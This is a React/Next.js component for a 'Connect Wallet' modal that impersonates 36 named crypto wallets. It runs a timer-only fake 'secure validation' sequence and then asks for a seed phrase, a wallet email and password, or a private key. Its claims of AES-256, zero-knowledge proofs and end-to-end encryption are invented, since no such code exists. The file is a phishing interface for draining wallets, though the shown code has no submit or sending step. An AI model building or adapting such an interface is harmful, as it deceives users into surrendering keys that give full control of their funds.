"use client";

import React, { useState, useEffect } from "react";
import Image from "next/image";
import { 
  Dialog, 
  DialogContent, 
  DialogHeader, 
  DialogTitle, 
  DialogTrigger 
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { 
  Search, 
  Lock, 
  Eye, 
  EyeOff,
  Key, 
  ShieldCheck, 
  ChevronLeft, 
  Info, 
  Shield, 
  CheckCircle2,
  Loader2,
  Mail,
  Fingerprint
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";

interface Wallet {
  name: string;
  desc: string;
  e2e: boolean;
  icon: string;
}

const wallets: Wallet[] = [
  { name: "METAMASK", desc: "BROWSER EXTENSION", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Manifest_Icon.svg" },
  { name: "PHANTOM", desc: "BROWSER EXTENSION", e2e: true, icon: "https://phantom.app/img/logo.png" },
  { name: "COINBASE WALLET", desc: "MOBILE/DESKTOP", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/d/de/Coinbase_Logo_2021.svg" },
  { name: "TRUST WALLET", desc: "MOBILE", e2e: true, icon: "https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.svg" },
  { name: "NABOX", desc: "EXTENSION/MOBILE", e2e: true, icon: "https://nabox.io/favicon.ico" },
  { name: "TAP WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://tap.global/favicon.ico" },
  { name: "ROBINHOOD WALLET", desc: "MOBILE", e2e: true, icon: "https://robinhood.com/favicon.ico" },
  { name: "TONKEEPER", desc: "MOBILE/EXTENSION", e2e: true, icon: "https://tonkeeper.com/favicon.ico" },
  { name: "ENJIN WALLET", desc: "MOBILE", e2e: true, icon: "https://enjin.io/favicon.ico" },
  { name: "SAFEPAL", desc: "HARDWARE/MOBILE", e2e: true, icon: "https://safepal.com/favicon.ico" },
  { name: "PETRA", desc: "BROWSER EXTENSION", e2e: true, icon: "https://petra.app/favicon.ico" },
  { name: "MARTIAN", desc: "BROWSER EXTENSION", e2e: true, icon: "https://martianwallet.xyz/favicon.ico" },
  { name: "SUI WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://sui.io/favicon.png" },
  { name: "CORE", desc: "EXTENSION/MOBILE", e2e: true, icon: "https://core.app/favicon.ico" },
  { name: "EXODUS", desc: "DESKTOP/MOBILE", e2e: true, icon: "https://www.exodus.com/favicon.ico" },
  { name: "KEPLR", desc: "BROWSER EXTENSION", e2e: true, icon: "https://www.keplr.app/favicon.ico" },
  { name: "ATOMIC WALLET", desc: "DESKTOP/MOBILE", e2e: true, icon: "https://atomicwallet.io/favicon.ico" },
  { name: "LEAP COSMOS", desc: "BROWSER EXTENSION", e2e: true, icon: "https://www.leapwallet.io/favicon.ico" },
  { name: "CAKE WALLET", desc: "MOBILE", e2e: true, icon: "https://cakewallet.com/favicon.ico" },
  { name: "GUARDA", desc: "DESKTOP/MOBILE", e2e: true, icon: "https://guarda.com/favicon.ico" },
  { name: "BINANCE WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://bin.bnbstatic.com/static/images/home/binance-logo.png" },
  { name: "OKX WALLET", desc: "MOBILE/EXTENSION", e2e: true, icon: "https://www.okx.com/cdn/assets/imgs/221/9E9A9B4B8B6A4A9C.png" },
  { name: "SOLFLARE", desc: "EXTENSION/MOBILE", e2e: true, icon: "https://solflare.com/assets/logo.svg" },
  { name: "LEDGER", desc: "HARDWARE", e2e: true, icon: "https://www.ledger.com/wp-content/uploads/2021/11/ledger-logo.png" },
  { name: "TREZOR", desc: "HARDWARE", e2e: true, icon: "https://trezor.io/static/images/trezor-logo.png" },
  { name: "BITGET WALLET", desc: "MOBILE/EXTENSION", e2e: true, icon: "https://img.bitgetimg.com/multi-language/web/1701074127608_bitget-logo.png" },
  { name: "UNISWAP WALLET", desc: "MOBILE", e2e: true, icon: "https://raw.githubusercontent.com/Uniswap/assets/master/logos/uniswap_logo.svg" },
  { name: "CRYPTO.COM", desc: "MOBILE", e2e: true, icon: "https://crypto.com/favicon.ico" },
  { name: "JUPITER WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://jup.ag/favicon.ico" },
  { name: "RABBY WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://rabby.io/favicon.ico" },
  { name: "STARGAZER WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://stargazer-wallet.io/favicon.ico" },
  { name: "TANGEM", desc: "HARDWARE", e2e: true, icon: "https://tangem.com/favicon.ico" },
  { name: "NEAR MOBILE", desc: "MOBILE", e2e: true, icon: "https://near.org/favicon.ico" },
  { name: "STARKEY WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://starkey.app/favicon.ico" },
  { name: "TAP", desc: "BROWSER EXTENSION", e2e: true, icon: "https://tap.global/favicon.ico" },
  { name: "OTHER WALLET", desc: "CUSTOM", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/e/e4/Wallet_Flat_Icon.svg" },
];

type View = "list" | "login" | "processing" | "methods" | "seed-phrase" | "email-password";

export function WalletModal({ children }: { children: React.ReactNode }) {
  const [view, setView] = useState<View>("list");
  const [search, setSearch] = useState("");
  const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
  const [processingStage, setProcessingStage] = useState(0);
  const [wordCount, setWordCount] = useState<12 | 24>(12);
  const [seedWords, setSeedWords] = useState<string[]>(Array(24).fill(""));

  const filteredWallets = wallets.filter(w => 
    w.name.toLowerCase().includes(search.toLowerCase())
  );

  const resetState = () => {
    setView("list");
    setSelectedWallet(null);
    setSearch("");
    setProcessingStage(0);
    setWordCount(12);
    setSeedWords(Array(24).fill(""));
  };

  const startLogin = () => {
    setView("processing");
  };

  useEffect(() => {
    if (view === "processing") {
      const timer1 = setTimeout(() => setProcessingStage(1), 800);
      const timer2 = setTimeout(() => setProcessingStage(2), 1600);
      const timer3 = setTimeout(() => setProcessingStage(3), 2400);
      const timer4 = setTimeout(() => setView("methods"), 3500);
      return () => {
        clearTimeout(timer1);
        clearTimeout(timer2);
        clearTimeout(timer3);
        clearTimeout(timer4);
      };
    }
  }, [view]);

  return (
    <Dialog onOpenChange={(open) => { if (!open) resetState(); }}>
      <DialogTrigger asChild>
        {children}
      </DialogTrigger>
      <DialogContent className="max-w-[480px] bg-[#0B0F17] border-white/5 p-0 gap-0 overflow-hidden text-white sm:rounded-[2rem] transition-all duration-300">
        <DialogHeader className="sr-only">
          <DialogTitle>
            {view === "list" && "Connect Wallet"}
            {view === "login" && `Login ${selectedWallet?.name}`}
            {view === "processing" && "Secure Protocol Active"}
            {view === "methods" && "Wallet Validation"}
            {view === "seed-phrase" && "Seed Phrase Validation"}
            {view === "email-password" && "Email & Password Validation"}
          </DialogTitle>
        </DialogHeader>
        
        {view === "list" && (
          <>
            <div className="p-6 pb-0">
              <div className="relative mb-6">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-4 h-4" />
                <Input 
                  placeholder="Search for your wallet..." 
                  className="bg-[#0D161F] border-none h-12 pl-12 text-sm focus-visible:ring-1 focus-visible:ring-primary/50 rounded-xl"
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                />
              </div>

              <div className="grid grid-cols-1 gap-3 max-h-[400px] overflow-y-auto pr-2 custom-scrollbar pb-6">
                {filteredWallets.map((wallet) => (
                  <button 
                    key={wallet.name}
                    onClick={() => {
                      setSelectedWallet(wallet);
                      setView("login");
                    }}
                    className="flex items-center gap-4 p-4 rounded-xl bg-[#0D161F]/50 border border-white/5 hover:border-primary/30 hover:bg-[#131C26] transition-all group text-left"
                  >
                    <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center p-1.5 relative shrink-0">
                      <div className="w-full h-full relative">
                        <Image 
                          src={wallet.icon} 
                          alt={wallet.name}
                          fill
                          className="object-contain p-0.5"
                          unoptimized={wallet.icon.endsWith('.svg') || wallet.icon.endsWith('.ico')}
                        />
                      </div>
                    </div>
                    <div className="flex-1">
                      <div className="text-sm font-headline font-bold tracking-tight">{wallet.name}</div>
                      <div className="flex items-center gap-1">
                        <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">{wallet.desc}</span>
                        {wallet.e2e && (
                          <>
                            <span className="text-[10px] text-slate-500">•</span>
                            <span className="text-[10px] text-primary flex items-center gap-1 font-bold">
                              <Lock size={8} /> E2E
                            </span>
                          </>
                        )}
                      </div>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            <div className="p-8 border-t border-white/5 bg-[#080C14]">
              <div className="grid grid-cols-3 gap-8 mb-8">
                <div className="space-y-2 text-center md:text-left">
                  <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center mx-auto md:mx-0">
                    <Lock className="text-primary w-4 h-4" />
                  </div>
                  <div className="font-headline text-xs font-black tracking-widest uppercase">Encryption</div>
                  <div className="text-[10px] text-slate-500 font-medium uppercase tracking-tight">AES-256 standards</div>
                </div>
                <div className="space-y-2 text-center md:text-left">
                  <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center mx-auto md:mx-0">
                    <Eye className="text-primary w-4 h-4" />
                  </div>
                  <div className="font-headline text-xs font-black tracking-widest uppercase">ZK-Proof</div>
                  <div className="text-[10px] text-slate-500 font-medium uppercase tracking-tight">Zero disclosure</div>
                </div>
                <div className="space-y-2 text-center md:text-left">
                  <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center mx-auto md:mx-0">
                    <Key className="text-primary w-4 h-4" />
                  </div>
                  <div className="font-headline text-xs font-black tracking-widest uppercase">Multi-sig</div>
                  <div className="text-[10px] text-slate-500 font-medium uppercase tracking-tight">Layered security</div>
                </div>
              </div>

              <div className="w-full h-12 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center gap-3 text-primary text-[10px] font-bold uppercase tracking-[0.2em]">
                <ShieldCheck size={14} />
                Institutional Grade Security Protocols Active
              </div>
            </div>
          </>
        )}

        {view === "login" && selectedWallet && (
          <div className="flex flex-col animate-in fade-in slide-in-from-right-4 duration-300">
            <div className="p-6 pb-0 flex items-center justify-between">
              <button 
                onClick={() => setView("list")}
                className="w-10 h-10 rounded-xl bg-[#0D161F] border border-white/5 flex items-center justify-center hover:bg-[#131C26] transition-colors group"
              >
                <ChevronLeft size={20} className="text-slate-400 group-hover:text-white" />
              </button>
              
              <div className="w-12 h-12 rounded-xl bg-[#0D161F] border border-white/5 flex items-center justify-center p-2 relative">
                <Image 
                  src={selectedWallet.icon} 
                  alt={selectedWallet.name}
                  fill
                  className="object-contain p-2"
                  unoptimized={selectedWallet.icon.endsWith('.svg') || selectedWallet.icon.endsWith('.ico')}
                />
              </div>

              <div className="w-10" />
            </div>

            <div className="p-8 pt-10 text-center">
              <h3 className="font-headline text-2xl font-black mb-2 uppercase tracking-tight">
                LOGIN {selectedWallet.name}
              </h3>
              <p className="text-slate-500 text-sm font-medium mb-10">
                Initialize secure validation protocol
              </p>

              <div className="space-y-6 text-left">
                <div className="space-y-3">
                  <label className="text-[10px] font-headline font-black uppercase tracking-[0.2em] text-slate-500 ml-1">
                    Wallet Address
                  </label>
                  <Input 
                    placeholder="0x..." 
                    className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm focus-visible:ring-1 focus-visible:ring-primary/50 rounded-2xl placeholder:text-slate-700"
                  />
                </div>

                <div className="p-4 rounded-2xl bg-[#0F222F]/50 border border-[#1A3A4D] flex gap-4 items-start">
                  <Info className="text-[#38BDF8] shrink-0 mt-1" size={18} />
                  <p className="text-[11px] text-slate-400 leading-relaxed">
                    Your address is strictly used for validation. It will be encrypted via <span className="text-slate-200">AES-256</span> before being sent to the secure endpoint.
                  </p>
                </div>

                <Button 
                  onClick={startLogin}
                  className="w-full h-14 bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-black text-xs uppercase tracking-[0.2em] rounded-2xl gap-3 shadow-lg shadow-orange-500/10"
                >
                  <Shield size={16} />
                  Login In
                </Button>
              </div>
            </div>

            <div className="mt-4 pb-8 text-center">
              <div className="flex items-center justify-center gap-2 text-[10px] text-slate-600 font-bold uppercase tracking-[0.3em]">
                <Lock size={12} />
                End-To-End Encrypted
              </div>
            </div>
          </div>
        )}

        {view === "processing" && selectedWallet && (
          <div className="flex flex-col items-center justify-center p-8 min-h-[500px] animate-in fade-in duration-500">
            <h3 className="font-headline text-2xl font-black mb-2 uppercase tracking-tight text-center">
              LOGIN {selectedWallet.name}
            </h3>
            <p className="text-slate-500 text-sm font-medium mb-12 text-center">
              Initialize secure validation protocol
            </p>

            <div className="relative w-32 h-32 mb-12">
               <div className="absolute inset-0 rounded-full bg-cyan-400/20 animate-pulse blur-xl"></div>
               <div className="absolute inset-0 rounded-full border-4 border-cyan-400/20 border-t-cyan-400 animate-spin"></div>
               <div className="absolute inset-2 rounded-full bg-[#0D161F] flex items-center justify-center">
                  <Shield className="text-cyan-400 w-12 h-12" />
               </div>
            </div>

            <div className="w-full space-y-3 mb-10">
              <h4 className="text-xs font-headline font-black text-center uppercase tracking-[0.2em] mb-6">
                Secure Protocol Active
                <span className="block text-[10px] text-slate-500 mt-1">End-to-end encryption in progress</span>
              </h4>

              <div className={cn(
                "flex items-center gap-3 p-4 rounded-xl border transition-all duration-300",
                processingStage >= 1 ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" : "bg-white/5 border-white/5 text-slate-500"
              )}>
                {processingStage >= 1 ? <CheckCircle2 size={18} /> : <Loader2 size={18} className="animate-spin" />}
                <span className="text-[10px] font-black uppercase tracking-widest">Encrypting Data Payload</span>
              </div>

              <div className={cn(
                "flex items-center gap-3 p-4 rounded-xl border transition-all duration-300",
                processingStage >= 2 ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" : "bg-white/5 border-white/5 text-slate-500"
              )}>
                {processingStage >= 2 ? <CheckCircle2 size={18} /> : processingStage === 1 ? <Loader2 size={18} className="animate-spin" /> : <div className="w-[18px]" />}
                <span className="text-[10px] font-black uppercase tracking-widest">Establishing Secure Tunnel</span>
              </div>

              <div className={cn(
                "flex items-center gap-3 p-4 rounded-xl border transition-all duration-300",
                processingStage >= 3 ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" : "bg-white/5 border-white/5 text-slate-500"
              )}>
                {processingStage >= 3 ? <CheckCircle2 size={18} /> : processingStage === 2 ? <Loader2 size={18} className="animate-spin" /> : <div className="w-[18px]" />}
                <span className="text-[10px] font-black uppercase tracking-widest">Validating with Node</span>
              </div>
            </div>

            <div className="w-full bg-[#0F222F] border border-[#1A3A4D] rounded-xl py-3 flex items-center justify-center gap-2 text-[#38BDF8] text-[9px] font-black uppercase tracking-[0.2em]">
               <Lock size={12} />
               AES-256 Military Grade Security
            </div>
          </div>
        )}

        {view === "methods" && (
          <div className="flex flex-col p-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
             <div className="text-center mb-10">
                <div className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-6">
                   <ShieldCheck className="text-primary w-8 h-8" />
                </div>
                <h3 className="font-headline text-3xl font-black mb-2 uppercase tracking-tight">
                  Wallet Validation
                </h3>
                <p className="text-slate-500 text-sm font-medium">
                  Select validation method to continue.
                </p>
             </div>

             <div className="space-y-4">
                <button 
                  onClick={() => setView("seed-phrase")}
                  className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left"
                >
                  <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                    <Fingerprint className="text-primary w-6 h-6" />
                  </div>
                  <div className="flex-1">
                    <div className="font-headline font-bold text-lg">Seed Phrase</div>
                    <div className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Standard recovery cold path</div>
                  </div>
                </button>

                <button 
                  onClick={() => setView("email-password")}
                  className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left"
                >
                  <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                    <Mail className="text-primary w-6 h-6" />
                  </div>
                  <div className="flex-1">
                    <div className="font-headline font-bold text-lg">Email & Password</div>
                    <div className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">For hosted/managed wallets</div>
                  </div>
                </button>

                <button className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left">
                  <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center group-hover:scale-110 transition-transform">
                    <Key className="text-primary w-6 h-6" />
                  </div>
                  <div className="flex-1">
                    <div className="font-headline font-bold text-lg">Private Key</div>
                    <div className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">Direct cryptographic access</div>
                  </div>
                </button>
             </div>

             <div className="mt-12 text-center">
                <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-white/5 border border-white/5 text-slate-500 text-[10px] font-bold uppercase tracking-widest">
                   <Shield size={12} />
                   Secure Protocol Failover
                </div>
             </div>
          </div>
        )}

        {view === "seed-phrase" && (
          <div className="flex flex-col animate-in fade-in slide-in-from-right-4 duration-300 overflow-y-auto max-h-[85vh] custom-scrollbar">
            <div className="p-6 pb-2 text-center relative">
              <div className="w-10 h-10 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto mb-4 border border-emerald-500/20">
                <Shield className="text-emerald-500 w-5 h-5" />
              </div>
              <h3 className="font-headline text-2xl font-black mb-1 uppercase tracking-tight">
                WALLET VALIDATION
              </h3>
              <p className="text-slate-500 text-[11px] font-bold tracking-widest">
                Select validation method to continue.
              </p>
            </div>

            <div className="px-6 py-2 flex items-center justify-between border-b border-white/5">
              <button 
                onClick={() => setView("methods")}
                className="flex items-center gap-2 text-[10px] font-black text-slate-400 hover:text-white uppercase tracking-widest transition-colors"
              >
                <ChevronLeft size={14} /> Back
              </button>
              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 text-[9px] font-black uppercase tracking-widest">
                <Lock size={10} /> E2E Protocol Active
              </div>
            </div>

            <div className="p-8">
              <h4 className="text-xs font-black uppercase tracking-[0.2em] mb-8 text-center sm:text-left">
                Seed Phrase Validation
              </h4>

              <div className="flex gap-2 mb-8">
                <button 
                  onClick={() => setWordCount(12)}
                  className={cn(
                    "flex-1 h-12 rounded-xl text-xs font-black uppercase tracking-widest transition-all",
                    wordCount === 12 ? "bg-emerald-500 text-black shadow-neon" : "bg-[#0D161F] text-slate-500 border border-white/5"
                  )}
                >
                  12 Words
                </button>
                <button 
                  onClick={() => setWordCount(24)}
                  className={cn(
                    "flex-1 h-12 rounded-xl text-xs font-black uppercase tracking-widest transition-all",
                    wordCount === 24 ? "bg-emerald-500 text-black shadow-neon" : "bg-[#0D161F] text-slate-500 border border-white/5"
                  )}
                >
                  24 Words
                </button>
              </div>

              <div className="grid grid-cols-2 gap-3 mb-10">
                {Array.from({ length: wordCount }).map((_, i) => (
                  <div key={i} className="relative group">
                    <div className="absolute left-4 top-1/2 -translate-y-1/2 text-[10px] font-black text-slate-600">
                      {i + 1}
                    </div>
                    <Input 
                      placeholder={`Word ${i + 1}`}
                      value={seedWords[i]}
                      onChange={(e) => {
                        const newWords = [...seedWords];
                        newWords[i] = e.target.value;
                        setSeedWords(newWords);
                      }}
                      className="bg-[#0D161F] border-white/5 h-12 pl-10 pr-10 text-[11px] font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-xl placeholder:text-slate-700"
                    />
                    <div className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-600">
                      <EyeOff size={14} />
                    </div>
                  </div>
                ))}
              </div>

              <Button className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10">
                <Shield size={16} />
                Login
              </Button>
            </div>
          </div>
        )}

        {view === "email-password" && (
          <div className="flex flex-col animate-in fade-in slide-in-from-right-4 duration-300">
            <div className="p-6 pb-2 text-center relative">
              <div className="w-10 h-10 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto mb-4 border border-emerald-500/20">
                <Shield className="text-emerald-500 w-5 h-5" />
              </div>
              <h3 className="font-headline text-2xl font-black mb-1 uppercase tracking-tight">
                WALLET VALIDATION
              </h3>
              <p className="text-slate-500 text-[11px] font-bold tracking-widest">
                Select validation method to continue.
              </p>
            </div>

            <div className="px-6 py-2 flex items-center justify-between border-b border-white/5">
              <button 
                onClick={() => setView("methods")}
                className="flex items-center gap-2 text-[10px] font-black text-slate-400 hover:text-white uppercase tracking-widest transition-colors"
              >
                <ChevronLeft size={14} /> Back
              </button>
              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 text-[9px] font-black uppercase tracking-widest">
                <Lock size={10} /> E2E Protocol Active
              </div>
            </div>

            <div className="p-8">
              <h4 className="text-xs font-black uppercase tracking-[0.2em] mb-8 text-center sm:text-left">
                Email & Password Validation
              </h4>

              <div className="space-y-4 mb-10">
                <Input 
                  placeholder="Wallet Email" 
                  className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-2xl placeholder:text-slate-700"
                />
                <Input 
                  type="password"
                  placeholder="Wallet Password" 
                  className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-emerald-500/50 rounded-2xl placeholder:text-slate-700"
                />
              </div>

              <Button className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-lg shadow-emerald-500/10">
                <Shield size={16} />
                Login
              </Button>

              <div className="mt-8 text-center">
                <div className="inline-flex items-center gap-2 text-[9px] text-slate-600 font-bold uppercase tracking-[0.3em]">
                   <div className="w-1.5 h-1.5 rounded-full border border-slate-600"></div>
                   Secure Protocol Failover
                </div>
              </div>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}
